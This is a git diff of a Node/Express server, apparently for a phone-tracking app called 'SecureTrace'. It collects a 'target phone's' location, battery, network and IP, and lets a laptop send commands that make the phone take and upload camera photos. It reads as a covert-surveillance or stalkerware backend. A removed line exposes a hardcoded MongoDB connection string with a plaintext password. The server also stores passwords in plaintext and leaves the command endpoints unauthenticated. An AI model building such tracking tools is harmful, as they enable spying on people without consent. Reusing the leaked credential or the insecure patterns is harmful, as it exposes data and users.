@@ -11,61 +11,72 @@ const app = express();
 const PORT = process.env.PORT || 10000;
 
 app.use(cors());
-app.use(express.json({ limit: '10mb' })); // Photo ke liye limit
-app.use(express.static(path.join(__dirname, 'frontend')));
+app.use(express.json({ limit: '10mb' })); // Camera photo ke liye limit badhayi
+app.use(express.static(path.join(__dirname, 'public')));
 
-const mongoURI = process.env.MONGO_URI || "mongodb+srv://priyanshurajthakur5634_db_user:6SO3JcNKgDLWjwhm@cluster0.yb3flx7.mongodb.net/SecureTraceDB?retryWrites=true&w=majority"; 
-mongoose.connect(mongoURI).then(() => console.log("[+] DATABASE CONNECTED!")).catch(err => console.log("[-] DATABASE FAILED:", err));
+// 1. DATABASE CONNECTION
+const mongoURI = process.env.MONGO_URI; 
+mongoose.connect(mongoURI)
+    .then(() => console.log("[+] DATABASE CONNECTED SUCCESSFULLY!"))
+    .catch(err => console.log("[-] DATABASE CONNECTION FAILED:", err));
 
+// 2. USER REGISTRATION
 app.post('/api/register', async (req, res) => {
     try {
         const { username, password, deviceId } = req.body;
         const existingUser = await User.findOne({ username });
         if (existingUser) return res.status(400).json({ success: false, message: "Username already exists!" });
+        
         const newUser = new User({ username, password, deviceId });
         await newUser.save();
-        res.json({ success: true, message: "Account created!" });
-    } catch (error) { res.status(500).json({ success: false, message: "Error" }); }
+        res.json({ success: true, message: "Account created successfully!" });
+    } catch (error) { res.status(500).json({ success: false, message: "Server Error" }); }
 });
 
+// 3. USER LOGIN
 app.post('/api/login', async (req, res) => {
     try {
         const { username, password } = req.body;
         const user = await User.findOne({ username, password });
         if (user) res.json({ success: true, deviceId: user.deviceId });
         else res.status(401).json({ success: false, message: "Invalid Credentials!" });
-    } catch (error) { res.status(500).json({ success: false, message: "Error" }); }
+    } catch (error) { res.status(500).json({ success: false, message: "Server Error" }); }
 });
 
+// 4. RECEIVE LOCATION FROM TARGET PHONE
 app.post('/api/update-location', async (req, res) => {
     try {
+        // YAHAN BATTERY AUR NETWORK RECEIVE HOGA
         const { deviceId, lat, lng, accuracy, battery, network, ipAddress } = req.body;
-        const newLocation = new Location({ deviceId, latitude: lat, longitude: lng, accuracy, battery, network, ipAddress });
+        const newLocation = new Location({ 
+            deviceId, latitude: lat, longitude: lng, accuracy, battery, network, ipAddress 
+        });
         await newLocation.save();
-        res.json({ success: true });
-    } catch (error) { res.status(500).json({ success: false }); }
+        res.json({ success: true, message: "Location securely updated." });
+    } catch (error) { res.status(500).json({ success: false, message: "Database Error!" }); }
 });
 
+// 5. SEND LOCATION TO DASHBOARD
 app.post('/api/get-location', async (req, res) => {
     try {
         const { deviceId } = req.body;
         const latestLocation = await Location.findOne({ deviceId }).sort({ timestamp: -1 });
         if (latestLocation) {
             res.json({
-                lat: parseFloat(latestLocation.latitude), lng: parseFloat(latestLocation.longitude),
-                accuracy: parseFloat(latestLocation.accuracy), battery: latestLocation.battery || "Unknown",
-                network: latestLocation.network || "Unknown", ipAddress: latestLocation.ipAddress || "Detecting...",
-                photoUrl: latestLocation.photoUrl || "", status: "LIVE TRACKING ACTIVE"
+                lat: parseFloat(latestLocation.latitude),
+                lng: parseFloat(latestLocation.longitude),
+                accuracy: parseFloat(latestLocation.accuracy),
+                battery: latestLocation.battery || "Unknown",
+                network: latestLocation.network || "Unknown",
+                ipAddress: latestLocation.ipAddress || "Unknown",
+                photoUrl: latestLocation.photoUrl || "",
+                status: "LIVE TRACKING ACTIVE"
             });
-        } else { res.json({ status: "TARGET OFFLINE" }); }
-    } catch (error) { res.status(500).json({ status: "ERROR" }); }
+        } else { res.json({ status: "TARGET OFFLINE / NO DATA" }); }
+    } catch (error) { res.status(500).json({ status: "ERROR FETCHING DATA" }); }
 });
 
-// =====================================
-// NAYA: ON-DEMAND CAMERA COMMAND SYSTEM
-// =====================================
-
-// Laptop command bhejega
+// 6. COMMAND SYSTEM (Photo lene ke liye)
 app.post('/api/send-command', async (req, res) => {
     try {
         await User.findOneAndUpdate({ deviceId: req.body.deviceId }, { actionCommand: req.body.command });
@@ -73,7 +84,6 @@ app.post('/api/send-command', async (req, res) => {
     } catch (err) { res.status(500).json({ success: false }); }
 });
 
-// Mobile baar-baar check karega ki koi command aayi kya
 app.post('/api/check-command', async (req, res) => {
     try {
         const user = await User.findOne({ deviceId: req.body.deviceId });
@@ -81,7 +91,6 @@ app.post('/api/check-command', async (req, res) => {
     } catch (err) { res.status(500).json({ command: "NONE" }); }
 });
 
-// Mobile photo lene ke baad upload karega aur command clear karega
 app.post('/api/upload-photo', async (req, res) => {
     try {
         const { deviceId, photoUrl } = req.body;
@@ -95,5 +104,12 @@ app.post('/api/upload-photo', async (req, res) => {
     } catch (err) { res.status(500).json({ success: false }); }
 });
 
-app.use((req, res) => { res.sendFile(path.join(__dirname, 'frontend', 'index.html')); });
-app.listen(PORT, () => console.log(`[+] SYSTEM ONLINE ON PORT ${PORT}`));
+// 7. CATCH-ALL ROUTE (Crash-proof)
+app.use((req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// 8. START SERVER
+app.listen(PORT, () => {
+    console.log(`[+] SYSTEM ONLINE ON PORT ${PORT}`);
+});
